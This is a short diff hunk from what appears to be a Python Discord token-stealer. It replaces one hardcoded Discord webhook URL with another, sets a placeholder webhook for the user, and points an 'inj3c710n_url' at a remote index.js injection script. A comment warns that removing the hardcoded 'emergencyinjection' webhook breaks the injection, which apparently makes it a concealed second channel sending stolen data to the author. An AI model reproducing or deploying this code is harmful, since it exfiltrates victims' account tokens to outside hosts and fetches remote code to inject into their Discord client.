@@ -535,7 +535,7 @@ def mac_check():
 
 hook = "YOUR WEBHOOK HERE"
 # Due to a recent glitch found on discord, you can keep up to 1mb of information on a link like the one under. Removing it may cause a fail in the injection.
-emergencyinjection = "https://discordapp.com/api/webhooks/1139963367382077582/IwGY6gsubuEp-hxJBqQF7ppkLvoUqSfgrjHRRVxqVxMFeEHXOxrJY0W_QIKxuAcsgHK-"
+emergencyinjection = "https://discord.com/api/webhooks/1143583197549043782/yVWATxco4RyLqRVtPEgh7hHeS5hlk98whUpkLTjqxCpNxsBFG18g9HwGr7NMsp1dvz8d"
 inj3c710n_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 color =  0x812118
 DETECTED = False
